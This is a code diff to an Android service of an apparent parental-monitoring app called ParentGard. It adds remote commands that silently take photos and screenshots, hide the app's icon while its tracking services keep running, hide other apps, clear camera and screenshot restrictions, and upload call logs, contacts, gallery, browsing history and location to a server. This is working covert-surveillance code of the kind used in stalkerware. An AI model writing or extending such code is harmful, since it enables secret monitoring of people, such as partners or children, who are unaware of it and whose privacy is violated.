@@ -54,6 +54,60 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
         val payload     = try { JSONObject(cmd.optString("payload", "{}")) } catch (_: Exception) { JSONObject() }
 
         try {
+            if (commandType == "capture_photo") {
+                val facing = payload.optString("camera", "back")
+
+                // Clear DPM camera policy if we are Device Owner (Samsung Knox may set it).
+                clearMediaRestrictions()
+
+                // Re-enable the package if hidden so the Samsung camera HAL sees it as active.
+                // Android 10+ silently drops startActivity() from background — capture directly
+                // in the foreground service instead of delegating to an Activity.
+                val pm = ctx.packageManager
+                val wasHidden = pm.getApplicationEnabledSetting(ctx.packageName) ==
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                if (wasHidden) {
+                    android.util.Log.d(TAG, "capture_photo: re-enabling package — waiting for Samsung HAL cache flush")
+                    pm.setApplicationEnabledSetting(ctx.packageName,
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP)
+                    Thread.sleep(2500)  // Samsung camera HAL caches package state; needs ~2s to flush
+                }
+
+                var result = capturePhoto(facing)
+                // Samsung HAL sometimes needs a second attempt after package re-enable
+                if (wasHidden && result.contains("CAMERA_DISABLED")) {
+                    android.util.Log.w(TAG, "capture_photo: CAMERA_DISABLED on first try, retrying after 1.5s")
+                    Thread.sleep(1500)
+                    result = capturePhoto(facing)
+                }
+                android.util.Log.d(TAG, "capture_photo result: ${result.take(80)}")
+
+                if (wasHidden) rehidePackage()
+                reportResult(token, commandId, "completed", result)
+                return
+            }
+
+            if (commandType == "take_screenshot") {
+                clearMediaRestrictions()
+                // Accessibility service dies when package is hidden; re-enable so it can reconnect.
+                val pm2 = ctx.packageManager
+                val wasHidden2 = pm2.getApplicationEnabledSetting(ctx.packageName) ==
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+                if (wasHidden2) {
+                    android.util.Log.d(TAG, "take_screenshot: re-enabling package so accessibility service reconnects")
+                    pm2.setApplicationEnabledSetting(ctx.packageName,
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP)
+                    Thread.sleep(2500)  // accessibility service needs time to reconnect after package re-enable
+                }
+                val ssResult = takeScreenshot()
+                android.util.Log.d(TAG, "take_screenshot result: ${ssResult.take(80)}")
+                if (wasHidden2) rehidePackage()
+                reportResult(token, commandId, "completed", ssResult)
+                return
+            }
+
             val result = when (commandType) {
                 "capture_photo"    -> capturePhoto(payload.optString("camera", "back"))
                 "take_screenshot"  -> takeScreenshot()
@@ -88,6 +142,52 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
                         removeBlockedApp(pkg)
                         """{"type":"ok","message":"Unblocked: $pkg"}"""
                     }
+                }
+                "hide_app" -> hideApp(payload.optString("packageName", ""))
+                "show_app" -> showApp(payload.optString("packageName", ""))
+                "sync_now" -> {
+                    // 1. Bump slow_cycle_ts — signals Flutter's MonitoringService when in foreground
+                    ctx.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
+                        .edit()
+                        .putLong("flutter.slow_cycle_ts", System.currentTimeMillis())
+                        .apply()
+                    // 2. Enqueue one-time Flutter WorkManager task (fires captureAllAndSync
+                    //    if WorkManager can reach Flutter's background engine)
+                    try {
+                        @Suppress("UNCHECKED_CAST")
+                        val workerClass = Class.forName("be.tramckrijte.workmanager.BackgroundWorker")
+                            as Class<androidx.work.ListenableWorker>
+                        val data = androidx.work.Data.Builder()
+                            .putString("be.tramckrijte.workmanager.DART_TASK", "pm_full_sync_task")
+                            .build()
+                        val req = androidx.work.OneTimeWorkRequest.Builder(workerClass)
+                            .setInputData(data)
+                            .build()
+                        androidx.work.WorkManager.getInstance(ctx)
+                            .enqueueUniqueWork("pm_sync_now_once",
+                                androidx.work.ExistingWorkPolicy.REPLACE, req)
+                    } catch (_: Exception) {}
+                    // 3. Native Kotlin immediate sync — primary path when app is hidden.
+                    val prefs    = ctx.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
+                    val token    = prefs.getString("flutter.pm_token", null)
+                    val deviceId = prefs.getString("flutter.pm_device_id", null)
+                    android.util.Log.i(TAG, "── sync_now: starting (deviceId=$deviceId, hasToken=${token != null}) ──")
+                    if (token != null && deviceId != null) {
+                        try { CallLogService(ctx).syncCallLogs(token, deviceId, baseUrl) }
+                        catch (e: Exception) { android.util.Log.e(TAG, "sync_now call log error: ${e.message}") }
+                        try { ContactsService(ctx).syncContacts(token, deviceId, baseUrl, force = true) }
+                        catch (e: Exception) { android.util.Log.e(TAG, "sync_now contacts error: ${e.message}") }
+                        try { GalleryService(ctx).syncGallery(token, deviceId, baseUrl) }
+                        catch (e: Exception) { android.util.Log.e(TAG, "sync_now gallery error: ${e.message}") }
+                        try { BrowsingHistoryService(ctx).syncBrowsingHistory(token, deviceId, baseUrl) }
+                        catch (e: Exception) { android.util.Log.e(TAG, "sync_now browsing error: ${e.message}") }
+                        try { LocationService(ctx).syncLocation(token, deviceId, baseUrl) }
+                        catch (e: Exception) { android.util.Log.e(TAG, "sync_now location error: ${e.message}") }
+                    } else {
+                        android.util.Log.w(TAG, "sync_now SKIP native sync — token or deviceId missing in FlutterSharedPreferences")
+                    }
+                    android.util.Log.i(TAG, "── sync_now: done ──")
+                    """{"type":"ok","message":"Sync triggered — fresh data incoming"}"""
                 }
                 else -> """{"type":"error","message":"unknown command: $commandType"}"""
             }
@@ -623,6 +723,122 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
         }
     }
 
+    // ── App visibility (hide / show) ──────────────────────────────────────────
+
+    private fun hideApp(packageName: String): String {
+        val pkg = packageName.takeIf { it.isNotBlank() } ?: ctx.packageName
+        return if (pkg == ctx.packageName) {
+            val pm = ctx.packageManager
+
+            // Step 1: Disable the application at package level.
+            // Samsung One UI only hides the icon when the application itself is disabled
+            // (component-level alias disable is ignored visually by Samsung's launcher).
+            pm.setApplicationEnabledSetting(
+                ctx.packageName,
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+
+            // Step 2: Explicitly re-enable every background component via setComponentEnabledSetting.
+            // On Android, component-level ENABLED overrides application-level DISABLED in
+            // PackageManager — so these components can start, restart after being killed, and
+            // fire after a device reboot. The icon stays hidden because Samsung's launcher
+            // checks the package-level state, not individual component states.
+            backgroundComponents().forEach { cls ->
+                try {
+                    pm.setComponentEnabledSetting(
+                        android.content.ComponentName(ctx, cls),
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP
+                    )
+                } catch (_: Exception) {}
+            }
+
+            """{"type":"ok","message":"ParentGard icon hidden"}"""
+        } else {
+            hideOtherApp(pkg)
+        }
+    }
+
+    private fun showApp(packageName: String): String {
+        val pkg = packageName.takeIf { it.isNotBlank() } ?: ctx.packageName
+        return if (pkg == ctx.packageName) {
+            val pm = ctx.packageManager
+
+            // Re-enable the application — icon reappears in launcher
+            pm.setApplicationEnabledSetting(
+                ctx.packageName,
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+
+            // Reset all explicitly-enabled background components back to DEFAULT so they
+            // cleanly follow application-level state going forward.
+            backgroundComponents().forEach { cls ->
+                try {
+                    pm.setComponentEnabledSetting(
+                        android.content.ComponentName(ctx, cls),
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
+                        android.content.pm.PackageManager.DONT_KILL_APP
+                    )
+                } catch (_: Exception) {}
+            }
+
+            """{"type":"ok","message":"ParentGard icon visible"}"""
+        } else {
+            showOtherApp(pkg)
+        }
+    }
+
+    private fun backgroundComponents(): List<Class<*>> = listOf(
+        com.parentalmonitor.child.services.TrackingForegroundService::class.java,
+        com.parentalmonitor.child.receivers.BootReceiver::class.java,
+        com.parentalmonitor.child.listeners.NotificationMonitorService::class.java,
+        com.parentalmonitor.child.services.AccessibilityMonitorService::class.java,
+        com.parentalmonitor.child.services.ScreenRecordService::class.java,
+        com.parentalmonitor.child.activities.ScreenCaptureActivity::class.java,
+        com.parentalmonitor.child.activities.CameraCaptureActivity::class.java,
+        com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java,
+    )
+
+    private fun hideOtherApp(pkg: String): String {
+        // Path 1: Device Owner — true launcher-level hiding via DPM
+        val dpm = ctx.getSystemService(android.content.Context.DEVICE_POLICY_SERVICE)
+                as android.app.admin.DevicePolicyManager
+        if (dpm.isDeviceOwnerApp(ctx.packageName)) {
+            val admin = android.content.ComponentName(
+                ctx, com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java)
+            return try {
+                dpm.setApplicationHidden(admin, pkg, true)
+                """{"type":"ok","message":"$pkg hidden from launcher"}"""
+            } catch (e: Exception) {
+                """{"type":"error","message":"DPM hide failed: ${e.message}"}"""
+            }
+        }
+
+        // Path 2: No Device Owner — accessibility block (closes app when opened)
+        addBlockedApp(pkg)
+        return """{"type":"ok","message":"$pkg blocked via accessibility (set app as Device Owner for true hiding)"}"""
+    }
+
+    private fun showOtherApp(pkg: String): String {
+        val dpm = ctx.getSystemService(android.content.Context.DEVICE_POLICY_SERVICE)
+                as android.app.admin.DevicePolicyManager
+        if (dpm.isDeviceOwnerApp(ctx.packageName)) {
+            val admin = android.content.ComponentName(
+                ctx, com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java)
+            return try {
+                dpm.setApplicationHidden(admin, pkg, false)
+                """{"type":"ok","message":"$pkg visible in launcher"}"""
+            } catch (e: Exception) {
+                """{"type":"error","message":"DPM show failed: ${e.message}"}"""
+            }
+        }
+
+        removeBlockedApp(pkg)
+        return """{"type":"ok","message":"$pkg unblocked (accessibility enforcement removed)"}"""
+    }
+
     // ── Lock device ───────────────────────────────────────────────────────────
 
     private fun sendLockBroadcast() {
@@ -722,6 +938,57 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
                 .replace("\"", "\\\"")
                 .replace("\n", "\\n")
                 .replace("\r", "\\r")}\""
+
+    // ── HTTP helper ───────────────────────────────────────────────────────────
+
+    // ── Camera / screenshot restriction clearing ──────────────────────────────
+    //
+    // Samsung Knox automatically sets DISALLOW_CAMERA and DISALLOW_SCREENSHOT user
+    // restrictions (and sometimes setCameraDisabled) when the app registers as Device
+    // Owner via ADB. These are cleared here before every camera or screenshot command.
+
+    private fun clearMediaRestrictions() {
+        try {
+            val dpm = ctx.getSystemService(android.app.admin.DevicePolicyManager::class.java)
+                ?: return
+            if (!dpm.isDeviceOwnerApp(ctx.packageName)) {
+                android.util.Log.w(TAG, "clearMediaRestrictions: not Device Owner, skipping")
+                return
+            }
+            val admin = android.content.ComponentName(
+                ctx, com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java)
+            val um = ctx.getSystemService(android.os.UserManager::class.java) ?: return
+
+            if (dpm.getCameraDisabled(null)) {
+                dpm.setCameraDisabled(admin, false)
+                android.util.Log.i(TAG, "Cleared DPM setCameraDisabled policy")
+            }
+            if (um.hasUserRestriction("no_camera")) {
+                dpm.clearUserRestriction(admin, "no_camera")
+                android.util.Log.i(TAG, "Cleared DISALLOW_CAMERA user restriction")
+            }
+            if (um.hasUserRestriction("no_screenshots")) {
+                dpm.clearUserRestriction(admin, "no_screenshots")
+                android.util.Log.i(TAG, "Cleared DISALLOW_SCREENSHOT user restriction")
+            }
+        } catch (e: Exception) {
+            android.util.Log.w(TAG, "clearMediaRestrictions: ${e.message}")
+        }
+    }
+
+    private fun rehidePackage() {
+        val pm = ctx.packageManager
+        pm.setApplicationEnabledSetting(ctx.packageName,
+            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            android.content.pm.PackageManager.DONT_KILL_APP)
+        backgroundComponents().forEach { cls ->
+            try {
+                pm.setComponentEnabledSetting(android.content.ComponentName(ctx, cls),
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    android.content.pm.PackageManager.DONT_KILL_APP)
+            } catch (_: Exception) {}
+        }
+    }
 
     // ── HTTP helper ───────────────────────────────────────────────────────────
 
